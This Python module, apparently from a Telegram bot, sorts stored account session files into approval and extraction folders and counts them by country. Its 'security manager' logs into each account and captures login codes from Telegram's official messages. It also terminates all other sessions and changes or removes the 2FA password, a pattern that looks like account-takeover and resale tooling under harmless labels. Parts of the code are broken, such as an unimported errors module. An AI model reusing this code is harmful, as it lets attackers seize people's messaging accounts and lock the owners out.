"""
Session Manager - Comprehensive session management system
Handles session organization, testing, approval, and extraction
"""

import os
import json
import shutil
import logging
import asyncio
import re
from datetime import datetime
from typing import Dict, List, Optional, Tuple
from pathlib import Path
from telethon import TelegramClient, events
from telethon.errors import SessionPasswordNeededError, AuthKeyDuplicatedError, AuthKeyUnregisteredError, UserDeactivatedError, UserDeactivatedBanError
from network.network_config import NetworkConfig, TelegramRetryManager, configure_ssl_warnings
from network.telegram_security import TelegramSecurityManager
from telethon.tl.functions.account import (
    GetPasswordRequest, 
    UpdatePasswordSettingsRequest,
    GetAuthorizationsRequest,
    ResetAuthorizationRequest
)
from telethon.tl.types.account import PasswordInputSettings

logger = logging.getLogger(__name__)


class ExtendedTelegramSecurityManager(TelegramSecurityManager):
    def __init__(self, api_id, api_hash, session_path):
        super().__init__(api_id, api_hash, session_path)
        self.backup_path = session_path + '.backup'
        self.verification_codes = []
        self.message_listener_running = False
        self.telegram_retry_manager = TelegramRetryManager()
        
        # Configure SSL warnings
        configure_ssl_warnings()
        
    async def create_backup(self):
        """Create a backup of the session"""
        try:
            if os.path.exists(self.session_path):
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                backup_path = f"{self.session_path}.backup_{timestamp}"
                shutil.copy2(self.session_path, backup_path)
                shutil.copy2(self.session_path, self.backup_path)
                print("Secure backup created successfully")
                return True
        except Exception as e:
            print(f"Error creating backup: {e}")
            return False
    
    async def safe_connect(self):
        """Secure connection to the account with network resilience"""
        try:
            if not await self.create_backup():
                return False
            
            # Get network configuration
            client_kwargs = NetworkConfig.get_telegram_client_kwargs()
            
            self.client = TelegramClient(
                self.session_path.replace('.session', ''),
                self.api_id,
                self.api_hash,
                **client_kwargs
            )
            
            # Use retry manager for connection
            await self.telegram_retry_manager.connect_client(self.client)
            await self.telegram_retry_manager.start_client(self.client)
            
            print("Connected successfully")
            
            await self.start_message_listener()
            
            return True
            
        except Exception as e:
            print(f"Connection error: {e}")
            return False
    
    async def start_message_listener(self):
        """Start verification message listener in background"""
        try:
            if self.message_listener_running:
                return
            
            @self.client.on(events.NewMessage)
            async def message_handler(event):
                try:
                    sender = await event.get_sender()
                    sender_id = sender.id
                    
                    if sender_id in self.official_telegram_ids:
                        if event.text:
                            code = self.extract_verification_code(event.text)
                            if code:
                                timestamp = datetime.now().strftime("%H:%M:%S")
                                self.verification_codes.append({
                                    'code': code,
                                    'time': timestamp,
                                    'text': event.text
                                })
                                if len(self.verification_codes) > 5:
                                    self.verification_codes.pop(0)
                except:
                    pass
            
            self.message_listener_running = True
            print("Verification message listener started in background")
            
        except Exception as e:
            print(f"Error starting message listener: {e}")
    
    def extract_verification_code(self, text):
        """Extract verification code from text"""
        if not text:
            return None
        
        patterns = [
            r'login code.*?(\d{4,6})',
            r'verification code.*?(\d{4,6})',
            r'code.*?(\d{4,6})',
            r'login.*?(\d{4,6})',
            r'(\d{4,6})',
        ]
        
        for pattern in patterns:
            match = re.search(pattern, text, re.IGNORECASE)
            if match:
                return match.group(1)
        
        return None
    
    async def scan_security_settings(self):
        """Comprehensive security settings scan"""
        try:
            print("Scanning security settings...")
            print("="*70)
            
            self.user_info = await self.telegram_retry_manager.get_me(self.client)
            print("Account Information:")
            print(f"   Name: {self.user_info.first_name if self.user_info.first_name else 'No name'}")
            print(f"   Phone Number: {self.user_info.phone}")
            print(f"   Account ID: {self.user_info.id}")
            
            self.password_info = await self.client(GetPasswordRequest())
            
            print("\nSecurity Settings:")
            has_password = getattr(self.password_info, 'has_password', False)
            has_recovery = getattr(self.password_info, 'has_recovery', False)
            
            print(f"   Two-Factor Authentication: {'Enabled' if has_password else 'Disabled'}")
            print(f"   Recovery Email: {'Enabled' if has_recovery else 'Disabled'}")
            
            print("\nEmail Settings:")
            
            login_email = getattr(self.password_info, 'login_email_pattern', None)
            if login_email:
                print(f"   Login Email: {login_email}")
            else:
                print("   Login Email: Not linked")
            
            unconfirmed_email = getattr(self.password_info, 'email_unconfirmed_pattern', None)
            if unconfirmed_email:
                print(f"   Unconfirmed Email: {unconfirmed_email}")
            
            print("="*70)
            
            return True
            
        except Exception as e:
            print(f"Error scanning settings: {e}")
            return False
    
    async def disable_2fa_working_method(self):
        """Disable Two-Factor Authentication - Working method"""
        try:
            print("Working method: Disable Two-Factor Authentication")
            
            current_password = input("Enter current password: ")
            
            # Simplified working method
            result = await self.client.edit_2fa(current_password)
            
            print("Two-Factor Authentication disabled successfully!")
            return True
            
        except Exception as e:
            print(f"Error disabling Two-Factor Authentication: {e}")
            return False
    
    async def change_2fa_password(self, current_password: str, new_password: str) -> bool:
        """Change 2FA password"""
        try:
            result = await self.client.edit_2fa(
                current_password=current_password,
                new_password=new_password
            )
            return True
        except Exception as e:
            logger.error(f"Error changing 2FA password: {e}")
            return False
    
    async def terminate_other_sessions(self) -> bool:
        """Terminate all other sessions except current one"""
        try:
            authorizations = await self.client(GetAuthorizationsRequest())
            
            terminated_count = 0
            for auth in authorizations.authorizations:
                if not getattr(auth, 'current', False):
                    try:
                        await self.client(ResetAuthorizationRequest(hash=auth.hash))
                        terminated_count += 1
                    except:
                        pass
            
            return terminated_count > 0
        except Exception as e:
            logger.error(f"Error terminating sessions: {e}")
            return False
    
    async def disconnect(self):
        """Disconnect the client"""
        if self.client:
            await self.client.disconnect()


class SessionManager:
    def __init__(self, sessions_dir: str, api_id: int, api_hash: str, pending_dir: str, approved_dir: str, rejected_dir: str, extracted_dir: str):
        self.sessions_dir = sessions_dir
        self.api_id = api_id
        self.api_hash = api_hash
        
        # Create directory structure
        self.pending_dir = pending_dir
        self.approved_dir = approved_dir
        self.rejected_dir = rejected_dir
        self.extracted_dir = extracted_dir
        
        # Create extracted sub-directories
        self.extracted_pending_dir = os.path.join(self.extracted_dir, "pending")
        self.extracted_approved_dir = os.path.join(self.extracted_dir, "approved")
        self.extracted_rejected_dir = os.path.join(self.extracted_dir, "rejected")
        
        # Create all directories
        for dir_path in [self.pending_dir, self.approved_dir, self.rejected_dir, 
                        self.extracted_dir, self.extracted_pending_dir, 
                        self.extracted_approved_dir, self.extracted_rejected_dir]:
            os.makedirs(dir_path, exist_ok=True)
    
    def get_sessions_by_status(self, status: str) -> List[Dict]:
        """Get sessions by status (pending, approved, rejected, extracted)"""
        status_dir = getattr(self, f"{status}_dir")
        sessions = []
        
        for filename in os.listdir(status_dir):
            if filename.endswith('.json'):
                json_path = os.path.join(status_dir, filename)
                try:
                    with open(json_path, 'r') as f:
                        session_data = json.load(f)
                        phone = session_data.get('phone', filename.replace('.json', ''))
                        sessions.append({
                            'phone': phone,
                            'path': json_path,
                            'data': session_data
                        })
                except Exception as e:
                    logger.error(f"Error loading session {filename}: {e}")
        
        return sessions
    
    def get_sessions_by_country(self, status: str, country_code: str) -> List[Dict]:
        """Get sessions by status and country code"""
        all_sessions = self.get_sessions_by_status(status)
        return [s for s in all_sessions if s['phone'].startswith(country_code)]
    
    def get_available_countries(self, status: str) -> List[str]:
        """Get available country codes for a specific status"""
        sessions = self.get_sessions_by_status(status)
        countries = set()
        
        for session in sessions:
            phone = session['phone']
            # Extract country code (assuming format like +966, +1, etc.)
            for i in range(2, 5):  # Check +XX to +XXXX
                if len(phone) > i:
                    country_code = phone[:i]
                    if country_code.startswith('+'):
                        countries.add(country_code)
        
        return sorted(list(countries))
    
    def move_session(self, phone: str, from_status: str, to_status: str, reason: str = None) -> bool:
        """Move session between status folders"""
        try:
            from_dir = getattr(self, f"{from_status}_dir")
            to_dir = getattr(self, f"{to_status}_dir")
            
            session_file = os.path.join(from_dir, f"{phone}.session")
            json_file = os.path.join(from_dir, f"{phone}.json")
            
            if not os.path.exists(session_file) or not os.path.exists(json_file):
                logger.error(f"Session files not found for {phone}")
                return False
            
            # Update JSON with new status and reason
            with open(json_file, 'r') as f:
                session_data = json.load(f)
            
            session_data['status'] = to_status
            session_data['status_changed_at'] = datetime.now().isoformat()
            if reason:
                session_data['status_reason'] = reason
            
            # Move files
            new_session_file = os.path.join(to_dir, f"{phone}.session")
            new_json_file = os.path.join(to_dir, f"{phone}.json")
            
            shutil.move(session_file, new_session_file)
            
            # Write updated JSON
            with open(new_json_file, 'w') as f:
                json.dump(session_data, f, indent=2)
            
            # Remove old JSON
            if os.path.exists(json_file):
                os.remove(json_file)
            
            logger.info(f"Moved session {phone} from {from_status} to {to_status}")
            return True
            
        except Exception as e:
            logger.error(f"Error moving session {phone}: {e}")
            return False
    
    async def test_session(self, phone: str, status: str = "pending") -> Dict:
        """Test session validity and check for 2FA/email using enhanced security manager"""
        try:
            status_dir = getattr(self, f"{status}_dir")
            session_file = os.path.join(status_dir, f"{phone}.session")
            json_file = os.path.join(status_dir, f"{phone}.json")
            
            if not os.path.exists(session_file):
                return {'valid': False, 'error': 'Session file not found'}
            
            # Use enhanced TelegramSecurityManager
            security_manager = ExtendedTelegramSecurityManager(self.api_id, self.api_hash, session_file)
            
            try:
                # Connect using the enhanced security manager
                connected = await security_manager.safe_connect()
                if not connected:
                    return {'valid': False, 'error': 'Failed to connect securely'}
                
                # Get user info
                if not security_manager.user_info:
                    security_manager.user_info = await security_manager.client.get_me()
                
                me = security_manager.user_info
                
                # Check if account is frozen/restricted
                is_frozen = await self._check_account_frozen(security_manager.client, me)
                if is_frozen:
                    await security_manager.disconnect()
                    return {'valid': False, 'error': 'Account is frozen or restricted'}
                
                # Get comprehensive security settings
                await security_manager.scan_security_settings()
                
                has_2fa = getattr(security_manager.password_info, 'has_password', False)
                has_email = getattr(security_manager.password_info, 'has_recovery', False)
                login_email = getattr(security_manager.password_info, 'login_email_pattern', None)
                
                await security_manager.disconnect()
                
                # Update session metadata with enhanced information
                if os.path.exists(json_file):
                    with open(json_file, 'r') as f:
                        session_data = json.load(f)
                    
                    session_data.update({
                        'telegram_user_id': me.id,
                        'username': me.username or '',
                        'first_name': me.first_name or '',
                        'last_name': me.last_name or '',
                        'has_2fa': has_2fa,
                        'has_email': has_email,
                        'login_email': login_email,
                        'last_tested': datetime.now().isoformat(),
                        'security_scan_complete': True,
                        'verification_codes_received': len(security_manager.verification_codes)
                    })
                    
                    with open(json_file, 'w') as f:
                        json.dump(session_data, f, indent=2)
                
                return {
                    'valid': True,
                    'has_2fa': has_2fa,
                    'has_email': has_email,
                    'login_email': login_email,
                    'telegram_user_id': me.id,
                    'username': me.username or '',
                    'first_name': me.first_name or '',
                    'last_name': me.last_name or '',
                    'verification_codes': security_manager.verification_codes
                }
                
            except Exception as e:
                await security_manager.disconnect()
                return {'valid': False, 'error': str(e)}
                
        except Exception as e:
            logger.error(f"Error testing session {phone}: {e}")
            return {'valid': False, 'error': str(e)}
    
    async def _check_account_frozen(self, client: TelegramClient, me) -> bool:
        """Check if the Telegram account has restrictions."""
        try:
            from sessions.session_utils import check_account_frozen
            return await check_account_frozen(client, me)
        except ImportError:
            # Fallback check if session_utils is not available
            try:
                # Try to send message to saved messages
                await client.send_message('me', 'Status check')
                return False
            except (errors.UserDeactivatedError, errors.UserDeactivatedBanError, errors.AuthKeyUnregisteredError):
                return True
            except (errors.FloodWaitError, errors.RPCError, ConnectionError, TimeoutError) as e:
                logger.warning(f"Network/API error during account frozen check: {e}")
                return True
            except Exception as e:
                logger.error(f"Unexpected error during account frozen check: {e}")
                return True
    
    async def manage_session_security(self, phone: str, status: str = "pending") -> Dict:
        """Manage session security using ExtendedTelegramSecurityManager"""
        try:
            status_dir = getattr(self, f"{status}_dir")
            session_file = os.path.join(status_dir, f"{phone}.session")
            
            if not os.path.exists(session_file):
                return {'success': False, 'error': 'Session file not found'}
            
            # Initialize enhanced security manager
            security_manager = ExtendedTelegramSecurityManager(self.api_id, self.api_hash, session_file)
            
            # Connect securely
            connected = await security_manager.safe_connect()
            if not connected:
                return {'success': False, 'error': 'Failed to connect securely'}
            
            # Scan security settings
            scan_result = await security_manager.scan_security_settings()
            if not scan_result:
                await security_manager.disconnect()
                return {'success': False, 'error': 'Failed to scan security settings'}
            
            # Terminate other sessions
            terminated = await security_manager.terminate_other_sessions()
            
            await security_manager.disconnect()
            
            return {
                'success': True,
                'security_scan': True,
                'sessions_terminated': terminated,
                'verification_codes': security_manager.verification_codes,
                'has_2fa': getattr(security_manager.password_info, 'has_password', False),
                'has_email': getattr(security_manager.password_info, 'has_recovery', False),
                'login_email': getattr(security_manager.password_info, 'login_email_pattern', None)
            }
            
        except Exception as e:
            logger.error(f"Error managing session security for {phone}: {e}")
            return {'success': False, 'error': str(e)}
    
    async def change_session_2fa(self, phone: str, current_password: str, new_password: str, status: str = "pending") -> bool:
        """Change 2FA password for a session using enhanced security manager"""
        try:
            status_dir = getattr(self, f"{status}_dir")
            session_file = os.path.join(status_dir, f"{phone}.session")
            
            if not os.path.exists(session_file):
                return False
            
            # Initialize enhanced security manager
            security_manager = ExtendedTelegramSecurityManager(self.api_id, self.api_hash, session_file)
            
            # Connect securely
            connected = await security_manager.safe_connect()
            if not connected:
                return False
            
            # Change 2FA password
            result = await security_manager.change_2fa_password(current_password, new_password)
            
            await security_manager.disconnect()
            
            return result
            
        except Exception as e:
            logger.error(f"Error changing 2FA for session {phone}: {e}")
            return False
    
    
    def get_session_info(self, phone: str, status: str) -> Optional[Dict]:
        """Get detailed session information"""
        try:
            status_dir = getattr(self, f"{status}_dir")
            json_file = os.path.join(status_dir, f"{phone}.json")
            
            if not os.path.exists(json_file):
                return None
            
            with open(json_file, 'r') as f:
                return json.load(f)
                
        except Exception as e:
            logger.error(f"Error getting session info for {phone}: {e}")
            return None
    
    def delete_session(self, phone: str, status: str) -> bool:
        """Delete session files"""
        try:
            status_dir = getattr(self, f"{status}_dir")
            session_file = os.path.join(status_dir, f"{phone}.session")
            json_file = os.path.join(status_dir, f"{phone}.json")
            
            if os.path.exists(session_file):
                os.remove(session_file)
            if os.path.exists(json_file):
                os.remove(json_file)
            
            logger.info(f"Deleted session {phone} from {status}")
            return True
            
        except Exception as e:
            logger.error(f"Error deleting session {phone}: {e}")
            return False
    
    def copy_session_to_extracted(self, phone: str, from_status: str) -> bool:
        """Copy session to extracted folder (organized by original status)"""
        try:
            from_dir = getattr(self, f"{from_status}_dir")
            to_dir = getattr(self, f"extracted_{from_status}_dir")
            
            session_file = os.path.join(from_dir, f"{phone}.session")
            json_file = os.path.join(from_dir, f"{phone}.json")
            
            if not os.path.exists(session_file) or not os.path.exists(json_file):
                logger.error(f"Session files not found for {phone}")
                return False
            
            # Copy files to extracted folder
            new_session_file = os.path.join(to_dir, f"{phone}.session")
            new_json_file = os.path.join(to_dir, f"{phone}.json")
            
            shutil.copy2(session_file, new_session_file)
            
            # Update JSON with extraction info
            with open(json_file, 'r') as f:
                session_data = json.load(f)
            
            session_data['extracted_at'] = datetime.now().isoformat()
            session_data['extracted_from'] = from_status
            session_data['original_status'] = from_status
            
            # Write updated JSON to extracted folder
            with open(new_json_file, 'w') as f:
                json.dump(session_data, f, indent=2)
            
            logger.info(f"Copied session {phone} from {from_status} to extracted/{from_status}")
            return True
            
        except Exception as e:
            logger.error(f"Error copying session {phone}: {e}")
            return False
    
    def get_extracted_sessions_by_status(self, original_status: str) -> List[Dict]:
        """Get extracted sessions by their original status"""
        extracted_dir = getattr(self, f"extracted_{original_status}_dir")
        sessions = []
        
        for filename in os.listdir(extracted_dir):
            if filename.endswith('.json'):
                json_path = os.path.join(extracted_dir, filename)
                try:
                    with open(json_path, 'r') as f:
                        session_data = json.load(f)
                        phone = session_data.get('phone', filename.replace('.json', ''))
                        sessions.append({
                            'phone': phone,
                            'path': json_path,
                            'data': session_data,
                            'original_status': original_status
                        })
                except Exception as e:
                    logger.error(f"Error loading extracted session {filename}: {e}")
        
        return sessions
    
    def get_all_extracted_sessions(self) -> Dict[str, List[Dict]]:
        """Get all extracted sessions organized by original status"""
        return {
            'pending': self.get_extracted_sessions_by_status('pending'),
            'approved': self.get_extracted_sessions_by_status('approved'),
            'rejected': self.get_extracted_sessions_by_status('rejected')
        }
    
    def get_session_stats(self) -> Dict:
        """Get session statistics"""
        stats = {
            'pending': len(self.get_sessions_by_status('pending')),
            'approved': len(self.get_sessions_by_status('approved')),
            'rejected': len(self.get_sessions_by_status('rejected'))
        }
        
        # Add extracted statistics
        try:
            extracted_stats = self.get_all_extracted_sessions()
            stats['extracted'] = {
                'pending': len(extracted_stats.get('pending', [])),
                'approved': len(extracted_stats.get('approved', [])),
                'rejected': len(extracted_stats.get('rejected', []))
            }
            stats['extracted']['total'] = sum(stats['extracted'].values())
            
            # Calculate total properly
            main_total = stats['pending'] + stats['approved'] + stats['rejected']
            extracted_total = stats['extracted']['total']
            stats['total'] = main_total + extracted_total
        except Exception as e:
            logger.error(f"Error calculating extracted statistics: {e}")
            stats['extracted'] = {'pending': 0, 'approved': 0, 'rejected': 0, 'total': 0}
            stats['total'] = stats['pending'] + stats['approved'] + stats['rejected']
        
        return stats
    
    def get_session_statistics(self) -> Dict:
        """Alias for get_session_stats for compatibility"""
        return self.get_session_stats()
    
    def get_detailed_statistics(self) -> Dict:
        """Get detailed session statistics with additional metrics"""
        basic_stats = self.get_session_stats()
        
        # Add more detailed statistics
        detailed_stats = basic_stats.copy()
        
        # Add countries breakdown
        countries = {}
        for status in ['pending', 'approved', 'rejected']:
            sessions = self.get_sessions_by_status(status)
            for session in sessions:
                country = session.get('country', 'Unknown')
                if country not in countries:
                    countries[country] = 0
                countries[country] += 1
        
        detailed_stats['countries'] = countries
        
        # Add performance metrics
        detailed_stats['performance'] = {
            'approval_rate': 0.0,
            'rejection_rate': 0.0,
            'avg_processing_time': 'N/A'
        }
        
        total_processed = basic_stats['approved'] + basic_stats['rejected']
        if total_processed > 0:
            detailed_stats['performance']['approval_rate'] = (basic_stats['approved'] / total_processed) * 100
            detailed_stats['performance']['rejection_rate'] = (basic_stats['rejected'] / total_processed) * 100
        
        return detailed_stats
    
    def search_sessions(self, search_term: str) -> List[Dict]:
        """Search sessions across all statuses"""
        results = []
        search_term = search_term.lower()
        
        for status in ['pending', 'approved', 'rejected']:
            sessions = self.get_sessions_by_status(status)
            for session in sessions:
                phone = session.get('phone', '').lower()
                country = session.get('country', '').lower()
                user_id = str(session.get('user_id', ''))
                
                if (search_term in phone or 
                    search_term in country or 
                    search_term in user_id):
                    session['status'] = status
                    results.append(session)
        
        return results
    
    def get_country_session_count(self, country_code: str) -> int:
        """Get session count for a specific country"""
        count = 0
        for status in ['pending', 'approved', 'rejected']:
            sessions = self.get_sessions_by_status(status)
            count += sum(1 for session in sessions if session.get('country') == country_code)
        return count
    
    def get_session_file_path(self, phone: str, status: str) -> Optional[str]:
        """Get the file path for a session"""
        status_dir = getattr(self, f"{status}_dir")
        session_file = os.path.join(status_dir, f"{phone}.session")
        return session_file if os.path.exists(session_file) else None
    
    def move_session_to_extracted(self, phone: str) -> bool:
        """Move session to extracted folder"""
        try:
            # Find the session in approved folder
            approved_session = os.path.join(self.approved_dir, f"{phone}.session")
            approved_json = os.path.join(self.approved_dir, f"{phone}.json")
            
            if os.path.exists(approved_session):
                # Move to extracted approved folder
                extracted_session = os.path.join(self.extracted_approved_dir, f"{phone}.session")
                extracted_json = os.path.join(self.extracted_approved_dir, f"{phone}.json")
                
                shutil.move(approved_session, extracted_session)
                if os.path.exists(approved_json):
                    shutil.move(approved_json, extracted_json)
                
                logger.info(f"Moved session {phone} to extracted folder")
                return True
            
            return False
        except Exception as e:
            logger.error(f"Error moving session {phone} to extracted: {e}")
            return False